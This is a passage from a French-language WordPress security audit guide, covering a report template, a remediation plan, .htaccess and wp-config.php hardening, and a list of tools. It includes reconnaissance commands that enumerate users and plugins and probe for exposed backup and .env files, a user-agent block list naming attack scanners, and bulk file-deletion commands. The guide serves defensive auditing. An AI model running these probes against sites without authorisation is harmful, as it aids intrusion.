| 🟠 Haute     | 3 |
| 🟡 Moyenne   | 5 |
| 🔵 Faible    | 4 |
| ℹ️ Info      | 8 |

**Risque global : ÉLEVÉ**

---

## Vulnérabilités Identifiées

### VUL-001 — [Criticité] Titre de la vulnérabilité

**Criticité :** 🔴 Critique (CVSS 9.8)  
**Composant :** Plugin / WordPress Core / Thème / Configuration  
**Version affectée :** X.X.X  
**CVE :** CVE-XXXX-XXXXX (si applicable)  

**Description :**  
Description technique de la vulnérabilité.

**Preuve (PoC) :**
\`\`\`
curl -s "https://example.com/vulnerable-endpoint?param=payload"
Réponse : [résultat prouvant la vulnérabilité]
\`\`\`

**Impact :**  
Description de ce qu'un attaquant peut faire.

**Remédiation :**  
- Action immédiate : mettre à jour le plugin vers la version X.X.X
- Action long terme : implémenter une WAF

**Référence :** https://wpscan.com/vulnerability/xxx

---

## Informations Générales Collectées

| Élément | Valeur | Risque |
|---------|--------|--------|
| Version WordPress | 6.3.1 | 🟠 Outdated |
| Préfixe BDD | wp_ (défaut) | 🟡 Moyen |
| XML-RPC | Activé | 🟠 Haut |
| API REST users | Exposée | 🟠 Haut |
| Fichier debug.log | Accessible | 🔴 Critique |
| wp-login.php | Non protégé | 🟠 Haut |
| HTTPS | Activé | 🟢 OK |
| Headers sécurité | Incomplets | 🟡 Moyen |

---

## Recommandations Prioritaires

1. (URGENT) Mettre à jour WordPress vers la dernière version stable
2. (URGENT) Supprimer le fichier debug.log exposé
3. (CRITIQUE) Mettre à jour le plugin [X] vers la version [Y]
4. (IMPORTANT) Désactiver XML-RPC si non utilisé
5. (IMPORTANT) Restreindre l'API REST pour les utilisateurs
```

---

## 13. Plan de remédiation

### Actions immédiates (J+0 à J+3)

```bash
# 1. Mettre à jour WordPress, plugins et thèmes
# Via l'interface admin : Tableau de bord → Mises à jour → Tout mettre à jour

# 2. Supprimer les fichiers sensibles exposés
rm /var/www/html/wp-content/debug.log
rm /var/www/html/error_log
rm /var/www/html/wp-config.php.bak
find /var/www/html -name "*.old" -delete
find /var/www/html -name "*.bak" -delete

# 3. Sécuriser wp-config.php
chmod 400 /var/www/html/wp-config.php
chown www-data:www-data /var/www/html/wp-config.php

# 4. Supprimer les fichiers PHP dans uploads
find /var/www/html/wp-content/uploads -name "*.php" -delete
find /var/www/html/wp-content/uploads -name "*.phtml" -delete

# 5. Changer les clés secrètes WordPress
# Générer de nouvelles clés : https://api.wordpress.org/secret-key/1.1/salt/
# Remplacer dans wp-config.php
```

### Configuration .htaccess de sécurité

```apache
# wp-content/.htaccess — Bloquer l'exécution PHP dans uploads
<Files "*.php">
  deny from all
</Files>

# .htaccess racine — Protections supplémentaires
# Bloquer l'accès direct aux fichiers sensibles
<FilesMatch "^(wp-config\.php|error_log|debug\.log|\.env|\.git)">
  Order allow,deny
  Deny from all
</FilesMatch>

# Désactiver le listing des répertoires
Options -Indexes

# Protéger le fichier .htaccess lui-même
<Files .htaccess>
  Order allow,deny
  Deny from all
</Files>

# Bloquer xmlrpc.php si non utilisé
<Files xmlrpc.php>
  Order allow,deny
  Deny from all
</Files>

# Limiter les méthodes HTTP
<LimitExcept GET POST HEAD>
  deny from all
</LimitExcept>

# Bloquer les user-agents suspects (scanners)
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (nikto|sqlmap|nmap|masscan|wpscan) [NC,OR]
RewriteCond %{HTTP_USER_AGENT} ^$ [OR]
RewriteCond %{HTTP_USER_AGENT} ^(-|'|libwww-perl|python|curl|wget) [NC]
RewriteRule .* - [F,L]
```

### Configuration wp-config.php sécurisée

```php
<?php
// wp-config.php — Configuration sécurisée

// Ne jamais afficher les erreurs en production
define('WP_DEBUG', false);
define('WP_DEBUG_LOG', false);
define('WP_DEBUG_DISPLAY', false);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/wordpress-errors.log'); // Hors du webroot

// Changer le préfixe des tables (à faire lors de l'installation)
$table_prefix = 'xK9m_'; // Préfixe aléatoire, pas "wp_"

// Désactiver l'éditeur de fichiers dans l'admin (sécurité importante)
define('DISALLOW_FILE_EDIT', true);

// Désactiver l'installation/mise à jour de plugins/thèmes via admin (optionnel)
define('DISALLOW_FILE_MODS', false); // Mettre true si CI/CD gère les updates

// Forcer SSL pour l'admin
define('FORCE_SSL_ADMIN', true);

// Limiter les révisions d'articles (performance + sécurité BDD)
define('WP_POST_REVISIONS', 5);

// Déplacer wp-content hors du chemin par défaut (optionnel, avancé)
// define('WP_CONTENT_DIR', '/var/www/wp-content');
// define('WP_CONTENT_URL', 'https://example.com/wp-content');

// Clés de sécurité — générer sur https://api.wordpress.org/secret-key/1.1/salt/
define('AUTH_KEY',         'clé-unique-générée-aléatoirement');
define('SECURE_AUTH_KEY',  'clé-unique-générée-aléatoirement');
define('LOGGED_IN_KEY',    'clé-unique-générée-aléatoirement');
define('NONCE_KEY',        'clé-unique-générée-aléatoirement');
define('AUTH_SALT',        'clé-unique-générée-aléatoirement');
define('SECURE_AUTH_SALT', 'clé-unique-générée-aléatoirement');
define('LOGGED_IN_SALT',   'clé-unique-générée-aléatoirement');
define('NONCE_SALT',       'clé-unique-générée-aléatoirement');
```

### Plugins de sécurité recommandés

```
Plugins à installer pour durcir WordPress :

1. Wordfence Security (gratuit/payant)
   - Firewall applicatif (WAF)
   - Scanner de malware
   - Blocage brute-force
   - Monitoring en temps réel

2. Sucuri Security (gratuit/payant)
   - Audit d'intégrité des fichiers
   - Monitoring des listes noires
   - Durcissement WordPress

3. WP Cerber Security (gratuit/payant)
   - Anti-spam
   - Protection connexion
   - Limitation tentatives

4. iThemes Security (gratuit/payant)
   - Hardening global
   - Authentification à 2 facteurs
   - Logs de sécurité

5. Limit Login Attempts Reloaded (gratuit)
   - Limiter tentatives de connexion
   - IP blocking automatique

6. WPS Hide Login (gratuit)
   - Changer l'URL de wp-login.php
   - Réduire les scans automatisés

⚠️  Ne pas installer trop de plugins de sécurité simultanément
    — ils peuvent entrer en conflit.
    Choisir 1 solution principale (Wordfence ou Sucuri).
```

---

## 14. Outils de référence

### Outils d'analyse

| Outil | Usage | Lien |
|-------|-------|------|
| WPScan | Scanner WordPress dédié | https://wpscan.com |
| Nikto | Scanner de vulnérabilités web | https://github.com/sullo/nikto |
| SQLMap | Test injection SQL automatisé | https://sqlmap.org |
| Burp Suite | Proxy d'interception HTTP | https://portswigger.net/burp |
| OWASP ZAP | Scanner DAST gratuit | https://www.zaproxy.org |
| Nuclei | Scanner de templates CVE | https://nuclei.projectdiscovery.io |
| GoSint / theHarvester | OSINT passif | https://github.com/laramies/theHarvester |

### Bases de données de vulnérabilités

| Ressource | Description |
|-----------|-------------|
| https://wpscan.com/plugins | Vulnérabilités plugins WordPress |
| https://patchstack.com/database | Base complète WP vulnérabilités |
| https://cve.mitre.org | Base nationale CVE |
| https://nvd.nist.gov | NVD NIST |
| https://www.exploit-db.com | Exploits publics |
| https://packetstormsecurity.com | Exploits et outils |

### Ressources de formation

| Ressource | Description |
|-----------|-------------|
| https://owasp.org/www-project-top-ten | OWASP Top 10 |
| https://owasp.org/www-project-wordpress-security-implementation-guideline | Guide WP OWASP |
| https://wordpress.org/about/security | Documentation sécurité officielle WP |
| https://portswigger.net/web-security | PortSwigger Web Security Academy (gratuit) |
| https://hack.me | Pratique légale en ligne |

### Commandes de référence rapide

```bash
# Vérification rapide complète
TARGET="https://example.com"
TOKEN="votre_token"

# 1. Vérifier la version et les vulnérabilités connues
wpscan --url $TARGET --api-token $TOKEN --enumerate vp,vt,u,cb

# 2. Vérifier les headers de sécurité
curl -sI $TARGET | grep -E "Strict|Content-Security|X-Frame|X-Content|Referrer"

# 3. Vérifier les fichiers sensibles
for f in readme.html wp-config.php.bak debug.log xmlrpc.php .env; do
  echo "$(curl -so/dev/null -w '%{http_code}' $TARGET/$f) - $f"
done

# 4. Vérifier l'API REST
curl -s "$TARGET/wp-json/wp/v2/users" | jq 'length'

# 5. Vérifier XML-RPC
curl -so/dev/null -w "%{http_code}" "$TARGET/xmlrpc.php"
```

---

*Guide rédigé à des fins éducatives et d'audit légal uniquement.*  
*Dernière mise à jour : Mai 2026*  
*Référence : OWASP WordPress Security Guide v1.0*
